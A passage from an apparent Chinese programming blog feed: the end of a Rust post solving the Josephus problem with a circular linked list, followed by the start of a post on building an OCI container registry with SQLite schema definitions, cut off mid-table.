    <span class="token keyword">fn</span> <span class="token function-definition function">test_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">CircularList</span><span class="token punctuation">::</span><span class="token function">new_single_node</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 遍历链表</span>
        list<span class="token punctuation">.</span><span class="token function">traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出死循环的1</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>接下来实现push操作：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">push_back</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> key<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> new_node <span class="token operator">=</span> <span class="token class-name">Rc</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">RefCell</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>
        index <span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len<span class="token punctuation">,</span>
        key<span class="token punctuation">,</span>
        next<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">match</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>tail <span class="token punctuation">&#123;</span>
        <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            <span class="token macro property">panic!</span><span class="token punctuation">(</span><span class="token string">"should new_single_node() first"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">Some</span><span class="token punctuation">(</span>tail<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> head <span class="token operator">=</span> tail<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            new_node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>
            tail<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>new_node<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>tail <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_push_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">CircularList</span><span class="token punctuation">::</span><span class="token function">new_single_node</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>接下来做删除，返回index和key的元组，分为两个部分，移动尾指针到指定位置和删除尾指针节点<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">m0ve</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span>  <span class="token keyword">self</span><span class="token punctuation">,</span> count<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>tail<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>tail<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>count <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> next <span class="token operator">=</span> current<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        current <span class="token operator">=</span> next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">self</span><span class="token punctuation">.</span>tail <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">fn</span> <span class="token function-definition function">delete</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> count<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token keyword">usize</span><span class="token punctuation">,</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>tail<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
        <span class="token macro property">panic!</span><span class="token punctuation">(</span><span class="token string">"Cannot delete from empty list"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 先移动尾指针到指定位置</span>
    <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">m0ve</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> tail_node <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>tail<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 如果只有一个节点，删除后链表为空</span>
        <span class="token keyword">let</span> deleted_index <span class="token operator">=</span> tail_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">;</span>
        <span class="token keyword">let</span> deleted_key <span class="token operator">=</span> tail_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>key<span class="token punctuation">;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>tail <span class="token operator">=</span> <span class="token class-name">None</span><span class="token punctuation">;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>deleted_index<span class="token punctuation">,</span> deleted_key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 删除尾节点的下一个节点（即头节点）</span>
    <span class="token keyword">let</span> head_node <span class="token operator">=</span> tail_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> deleted_index <span class="token operator">=</span> head_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">;</span>
    <span class="token keyword">let</span> deleted_key <span class="token operator">=</span> head_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>key<span class="token punctuation">;</span>

    <span class="token comment">// 获取头节点的下一个节点</span>
    <span class="token keyword">let</span> new_head <span class="token operator">=</span> head_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 让尾节点直接指向新的头节点，跳过要删除的节点</span>
    tail_node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>new_head<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token punctuation">(</span>deleted_index<span class="token punctuation">,</span> deleted_key<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">fn</span> <span class="token function-definition function">test_move_and_delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">CircularList</span><span class="token punctuation">::</span><span class="token function">new_single_node</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//list.traverse();</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>move并不是一个可用的函数名，所以这里用了m0ve</p>
<p>准备完毕，接下来就可以写约瑟夫环的运行函数了：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span>keys <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> m<span class="token punctuation">:</span><span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//构建环</span>
    <span class="token keyword">let</span> len <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> bind <span class="token operator">=</span> <span class="token class-name">CircularList</span><span class="token punctuation">::</span><span class="token function">new_single_node</span><span class="token punctuation">(</span>keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">1</span><span class="token punctuation">..</span>len <span class="token punctuation">&#123;</span>
        bind<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>keys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//输出</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> num <span class="token operator">=</span> m<span class="token punctuation">;</span>
    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>len <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token punctuation">(</span>index<span class="token punctuation">,</span> new_num<span class="token punctuation">)</span><span class="token operator">=</span> bind<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//退一个</span>
        <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125; "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>
        num <span class="token operator">=</span> new_num<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> test1 <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name">CircularList</span><span class="token punctuation">::</span><span class="token function">run</span><span class="token punctuation">(</span>test1<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>观察输出：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">running <span class="token number">4</span> tests
<span class="token number">6</span> <span class="token number">1</span> <span class="token number">4</span> <span class="token number">7</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">5</span> <span class="token builtin class-name">test</span> tests::test_move_and_delete <span class="token punctuation">..</span>. ok
<span class="token builtin class-name">test</span> tests::test_new <span class="token punctuation">..</span>. ok
<span class="token builtin class-name">test</span> tests::test_run <span class="token punctuation">..</span>. ok
<span class="token builtin class-name">test</span> tests::test_push_back <span class="token punctuation">..</span>. ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>完美</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;上一篇是根据rust语言圣经的指导写的迭代器版本，这次我想用一种更贴近过程式的风格&lt;/p&gt;
&lt;h2 id=&quot;实验一：城市链表&quot;&gt;&lt;a href=&quot;#实验一：城市链表&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
    <category term="链表" scheme="https://aucept.in/tags/%E9%93%BE%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>docker registry</title>
    <link href="https://aucept.in/2025/09/26/docker-and-OCI/"/>
    <id>https://aucept.in/2025/09/26/docker-and-OCI/</id>
    <published>2025-09-26T11:49:36.000Z</published>
    <updated>2025-09-28T09:54:41.151Z</updated>
    
    <content type="html"><![CDATA[<p>OCI即Open Container Initiative，开放容器计划，是一套有关容器与镜像的标准</p>
<p>想要实现一个容器镜像仓库，就要符合OCI的标准与规定的接口</p>
<p>该服务主要维护blob与manifest两种对象，其中blob记录了镜像文件的实际存储路径，manifest（货单）则是用来记录存在这样一个blob</p>
<p>此外还有一个Manifest List，是一个 Tag 所对应所有 Manifest 的元数据列表。digest是manifest和blob的标识符，然而在不同平台digest并不相同，且digest并不方便阅读，于是增加一个tag做标识</p>
<p>建表语句如下：<br><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> blobs <span class="token punctuation">(</span>
    digest <span class="token keyword">TEXT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    size <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    storage_path <span class="token keyword">TEXT</span><span class="token punctuation">,</span>
    content_type <span class="token keyword">TEXT</span><span class="token punctuation">,</span>
    created_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    accessed_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">CHECK</span><span class="token punctuation">(</span>digest <span class="token operator">LIKE</span> <span class="token string">'sha256:%'</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> uploads <span class="token punctuation">(</span>
    uuid <span class="token keyword">TEXT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    repository <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    tmp_path <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    <span class="token keyword">offset</span> <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token number">0</span><span class="token punctuation">,</span>
    created_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    updated_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> manifests <span class="token punctuation">(</span>
    digest <span class="token keyword">TEXT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    repository <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    tag <span class="token keyword">TEXT</span><span class="token punctuation">,</span>
    media_type <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    schema_version <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token number">2</span><span class="token punctuation">,</span>
    config_digest <span class="token keyword">TEXT</span><span class="token punctuation">,</span>
    <span class="token keyword">data</span> <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    created_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    updated_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>config_digest<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> blobs<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">CHECK</span><span class="token punctuation">(</span>digest <span class="token operator">LIKE</span> <span class="token string">'sha256:%'</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> manifest_layers <span class="token punctuation">(</span>
    id <span class="token keyword">INTEGER</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> AUTOINCREMENT<span class="token punctuation">,</span>
    manifest_digest <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    layer_digest <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    layer_order <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    media_type <span class="token keyword">TEXT</span><span class="token punctuation">,</span>
    size <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>
    <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>manifest_digest<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> manifests<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>layer_digest<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> blobs<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">UNIQUE</span><span class="token punctuation">(</span>manifest_digest<span class="token punctuation">,</span> layer_order<span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> manifest_lists <span class="token punctuation">(</span>
    digest <span class="token keyword">TEXT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    repository <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    tag <span class="token keyword">TEXT</span><span class="token punctuation">,</span>
    media_type <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token string">'application/vnd.docker.distribution.manifest.list.v2+json'</span><span class="token punctuation">,</span>
    schema_version <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token number">2</span><span class="token punctuation">,</span>
    <span class="token keyword">data</span> <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    created_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    updated_at <span class="token keyword">TEXT</span> <span class="token keyword">DEFAULT</span> <span class="token punctuation">(</span><span class="token keyword">datetime</span><span class="token punctuation">(</span><span class="token string">'now'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">CHECK</span><span class="token punctuation">(</span>digest <span class="token operator">LIKE</span> <span class="token string">'sha256:%'</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> manifest_list_manifests <span class="token punctuation">(</span>
    id <span class="token keyword">INTEGER</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> AUTOINCREMENT<span class="token punctuation">,</span>
    list_digest <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    manifest_digest <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    architecture <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
